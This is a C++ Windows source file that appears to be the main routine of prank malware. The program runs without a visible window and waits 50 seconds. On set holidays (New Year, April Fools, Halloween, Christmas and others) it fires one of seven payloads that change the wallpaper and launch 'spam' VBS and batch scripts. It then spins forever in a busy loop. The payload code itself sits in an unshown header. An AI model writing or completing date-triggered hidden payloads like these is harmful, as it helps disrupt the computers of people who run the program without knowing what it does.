#define _CRT_SECURE_NO_WARNINGS

#include <iostream>
#include <ctime>
#include <vector>
#include <string>
#include <windows.h>
#include "payloads.h"

void showConsole();

INT
WINAPI
wWinMain(_In_ HINSTANCE hInstance, _In_opt_ HINSTANCE hPrevInstance, _In_ PWSTR szCmdLine, _In_ INT nShowCmd)
{
	time_t now = time(0);             //get the number of seconds elapsed since 01/01/1970
	tm* ltm = localtime(&now);        //get local time

	int cur_day = ltm->tm_mday;       //get current day
	int cur_month = ltm->tm_mon + 1;  //get current month

	Payloads payloads;

	Sleep(50000);

	//showConsole();

	std::cout << "Current day: " << cur_day << '\n';
	std::cout << "Current month: " << cur_month << '\n';
	std::cout << "Wallpaper path: " << payloads.wallpath << '\n';
	std::cout << "spam1.vbs start command: " << payloads.msg1cmd << '\n';
	std::cout << "spam2.vbs start command: " << payloads.bat2cmd << '\n';
	std::cout << "msg3.vbs start command: " << payloads.msg3cmd << '\n';
	std::cout << "spam3.vbs start command: " << payloads.bat3cmd << '\n';

	if ((cur_month == 1) && (cur_day == 1))
	{
		payloads.payload1();
	}
	else if ((cur_month == 4) && (cur_day == 1))
	{
		payloads.payload2();
	}
	else if ((cur_month == 4) && (cur_day == 21))
	{
		payloads.payload3();
	}
	else if ((cur_month == 10) && (cur_day == 31))
	{
		payloads.payload4();
	}
	else if ((cur_month == 12) && (cur_day == 25))
	{
		payloads.payload5();
	}
	else if ((cur_month == 12) && (cur_day == 30))
	{
		payloads.payload6();
	}
	else if ((cur_month == 12) && (cur_day == 31))
	{
		payloads.payload7();
	}
	
	while (true);
	return 0;
}

void showConsole()
{
	AllocConsole();
	freopen("CONOUT$", "w", stdout);
	freopen("CONOUT$", "w", stderr);
}